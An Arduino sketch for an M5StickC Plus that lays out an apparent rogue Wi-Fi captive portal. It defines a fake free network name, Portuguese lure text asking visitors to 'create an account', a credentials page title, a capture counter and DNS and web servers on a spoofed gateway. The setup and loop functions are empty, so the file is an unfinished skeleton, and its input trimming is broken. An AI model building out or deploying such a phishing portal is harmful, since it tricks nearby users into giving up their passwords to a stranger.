#include <M5StickCPlus.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>

//config do user
#define SSID_NAME "WiFi do Foca"
#define SUBTITLE "Sistema de Internet Gratuita."
#define TITLE "Registre-se:"
#define BODY "Crie uma conta para liberar acesso ao sistema gratuito de WiFi do Foca."
#define POST_TITLE "Validando..."
#define POST_BODY "Sua conta esta sendo validada. Por favor, aguarde uma mensagem confirmando o cadastro em seu e-mail.</br>Muito Obrigada."
#define PASS_TITLE "Credenciais"
#define CLEAR_TITLE "Cleared"

int capcount=0;
int previous=-1; 
int BUILTIN_LED = 10;

//Settings do init do sistema
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1); // Gateway

String Credentials = "";
unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
DNSServer dnsServer; WebServer webServer(80);

String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;"); a.replace(">", "&gt;");
  a.substring(0, 200); return a;
}

String footer() {
  return
    "</div><div class=q><a>Patria Amada Bostil &#169;. Desordem e Regresso.</a></div>";
}

void setup() {
  // put your setup code here, to run once:

}

void loop() {
  // put your main code here, to run repeatedly:

}
